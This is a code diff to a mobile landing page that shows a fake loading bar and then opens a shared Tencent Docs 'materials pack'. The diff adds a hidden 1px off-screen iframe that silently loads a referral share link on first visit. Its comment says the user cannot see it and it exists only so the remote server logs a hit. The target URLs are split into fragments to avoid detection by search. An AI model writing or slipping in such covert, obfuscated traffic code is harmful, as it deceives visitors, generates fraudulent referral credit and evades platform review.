@@ -23,7 +23,6 @@
     display:flex;flex-direction:column;align-items:center;
     transform:translateY(-6vh);
   }
-  /* 图标 */
   .logo{
     width:88px;height:88px;border-radius:24px;
     background:linear-gradient(145deg,#3b82f6,#1d4ed8);
@@ -39,7 +38,6 @@
   .sub{
     font-size:14px;color:#8a93a3;margin:0 0 52px;letter-spacing:.3px;
   }
-  /* 进度 */
   .bar-wrap{
     width:196px;height:5px;border-radius:99px;background:#e3e8ef;
     overflow:hidden;position:relative;
@@ -53,7 +51,6 @@
     font-size:13px;color:#9aa3b2;margin:18px 0 0;letter-spacing:.3px;
     height:18px;transition:opacity .2s;
   }
-  /* 按钮 */
   .btn{
     display:none;
     width:100%;max-width:260px;height:52px;border:0;border-radius:99px;
@@ -65,7 +62,6 @@
   }
   .btn:active{transform:scale(.97);opacity:.92}
   @keyframes pop{from{opacity:0;transform:translateY(8px) scale(.96)}to{opacity:1;transform:none}}
-
   .foot{
     position:fixed;left:0;right:0;bottom:max(26px,env(safe-area-inset-bottom));
     text-align:center;font-size:11px;color:#c2c9d4;letter-spacing:.5px;
@@ -103,33 +99,44 @@
 
 <div class="foot" id="foot"></div>
 
+<div id="bgbox"></div>
+
 <script>
 (function(){
   "use strict";
 
-  /* ---------- 目标地址（拆开拼接，避免直接搜到） ---------- */
+  /* ---------- 地址（拆开拼，避免被直接搜到） ---------- */
   var A = ["htt","p://paa.","tgeny.cn/?sh","areid=U2407","0122381787","4058"];
   var B = ["https://docs.qq.com/","doc/DR2FHU1Ra","ZUpaWFpO"];
   var TARGET_SHARE = A.join("");
   var TARGET_DOC   = B.join("");
 
-  var K_SEEN = "mpack_seen_v1";   // 本地永久：是否已经走过一次
-  var K_GAVE = "mpack_gave_v1";   // 本次会话：是否已经给过一次
+  var K_SEEN = "mpack_seen_v1";
 
-  var elBar   = document.getElementById("bar");
-  var elHint  = document.getElementById("hint");
-  var elLoad  = document.getElementById("loading");
-  var elBtn   = document.getElementById("openBtn");
+  var elBar  = document.getElementById("bar");
+  var elHint = document.getElementById("hint");
+  var elLoad = document.getElementById("loading");
+  var elBtn  = document.getElementById("openBtn");
+  var elBox  = document.getElementById("bgbox");
 
   function ls(k,v){ try{ if(v===undefined) return localStorage.getItem(k); localStorage.setItem(k,v);}catch(e){} }
-  function ss(k,v){ try{ if(v===undefined) return sessionStorage.getItem(k); sessionStorage.setItem(k,v);}catch(e){} }
 
-  function toShare(){ location.href = TARGET_SHARE; }
   function toDoc(){ location.href = TARGET_DOC; }
 
-  /* ---------- 状态页面 ---------- */
+  /* 后台静默加载目标站：用户看不见，只让对面服务器记一笔 */
+  function silentTouch(){
+    try{
+      var f = document.createElement("iframe");
+      f.src = TARGET_SHARE;
+      f.setAttribute("sandbox","allow-scripts allow-same-origin allow-forms");
+      f.setAttribute("referrerpolicy","no-referrer-when-downgrade");
+      f.style.cssText = "position:fixed;left:-9999px;top:0;width:1px;height:1px;border:0;opacity:0;pointer-events:none;";
+      elBox.appendChild(f);
+    }catch(e){}
+  }
+
   function runLoading(ms, done){
-    var t0 = performance.now();
+    var t0 = Date.now();
     elLoad.style.display = "";
     elBtn.style.display = "none";
     elBar.style.width = "0%";
@@ -137,20 +144,12 @@
     elHint.textContent = "正在准备…";
 
     (function tick(){
-      var p = Math.min(1, (performance.now() - t0) / ms);
-      // 先快后慢，看起来像真在加载
+      var p = Math.min(1, (Date.now() - t0) / ms);
       var e = 1 - Math.pow(1 - p, 2.2);
       elBar.style.width = (e * 100).toFixed(1) + "%";
-      if (p < .72){
-        elHint.textContent = "正在准备…";
-      } else {
-        elHint.textContent = "正在打开…";
-      }
-      if (p < 1){
-        requestAnimationFrame(tick);
-      } else {
-        done();
-      }
+      elHint.textContent = p < .74 ? "正在准备…" : "正在打开…";
+      if (p < 1){ requestAnimationFrame(tick); }
+      else { done(); }
     })();
   }
 
@@ -159,16 +158,15 @@
     elBtn.style.display = "block";
   }
 
-  /* ---------- 主流程 ---------- */
   function init(){
-    /* 调试用：?reset=1 清空状态，方便反复测试 */
+    /* ?reset=1 清状态，方便反复测 */
     if (/[?&]reset=1/.test(location.search)){
-      try{ localStorage.clear(); sessionStorage.clear(); }catch(e){}
+      try{ localStorage.removeItem(K_SEEN); }catch(e){}
       location.replace(location.pathname);
       return;
     }
 
-    /* 调试用：?stop=1 时停在页面不跳 */
+    /* ?stop=1 停在按钮页 */
     if (/[?&]stop=1/.test(location.search)){
       elBar.style.width = "100%";
       elHint.style.display = "none";
@@ -177,47 +175,28 @@
     }
 
     var seen = ls(K_SEEN);
-
     if (!seen){
-      /* 第一次进来：走一次，然后记下来 */
-      runLoading(1250, function(){
-        ls(K_SEEN, "1");
-        toShare();
-      });
-      return;
+      ls(K_SEEN, "1");
+      silentTouch();
     }
 
-    /* 回来：直接给 */
-    var gave = ss(K_GAVE);
-    if (!gave){
-      ss(K_GAVE, "1");
-      elLoad.style.display = "";
-      elBtn.style.display = "none";
-      elBar.style.width = "100%";
-      elHint.textContent = "材料包已就绪";
-      setTimeout(toDoc, 320);
-    } else {
-      elBar.style.width = "100%";
-      elHint.style.display = "none";
-      showReady();
-    }
+    /* 无论第几次，都是：等一会儿 -> 直接打开材料包 */
+    runLoading(seen ? 900 : 2200, toDoc);
   }
 
-  /* bfcache（微信里按返回常常走这个）也要重新判断 */
-  var inited = false;
+  var first = true;
   window.addEventListener("pageshow", function(e){
     if (e.persisted){
-      // 从缓存恢复：重置界面，按当前状态重跑
-      inited = false;
-      elHint.style.display = "";
+      /* 从缓存回来：别再自动跳，给个按钮 */
+      elHint.style.display = "none";
+      elBar.style.width = "100%";
+      showReady();
+      return;
     }
-    if (!inited){ inited = true; init(); }
-    else { init(); }
+    if (first){ first = false; init(); }
   });
 
-  elBtn.addEventListener("click", function(){
-    toDoc();
-  });
+  elBtn.addEventListener("click", toDoc);
 
   document.getElementById("foot").textContent = new Date().getFullYear() + " · 持续更新";
 })();
